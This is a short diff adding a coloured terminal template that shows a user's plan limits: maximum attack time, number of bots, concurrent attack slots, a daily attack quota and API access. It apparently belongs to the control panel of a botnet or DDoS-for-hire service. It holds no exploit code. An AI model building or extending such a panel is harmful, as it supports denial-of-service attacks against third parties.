@@ -1,0 +1,8 @@
+\033[2J\033[H\033[38;5;231m
+ Your Plan\x1b[38;5;160m:\r
+\033[38;5;231m  Max Attack Time \x1b[38;5;160m:\033[38;5;231m {max_time} seconds\r
+\033[38;5;231m  Max Bots        \x1b[38;5;160m:\033[38;5;231m {max_bots} bots\r
+\033[38;5;231m  Max Slots       \x1b[38;5;160m:\033[38;5;231m {max_slots} concurrent attacks\r
+\033[38;5;231m  Daily Limit     \x1b[38;5;160m:\033[38;5;231m {daily_used}/{daily_limit} attacks today\r
+\033[38;5;231m  API Access      \x1b[38;5;160m:\033[38;5;231m {api_access}\r
+\033[0m
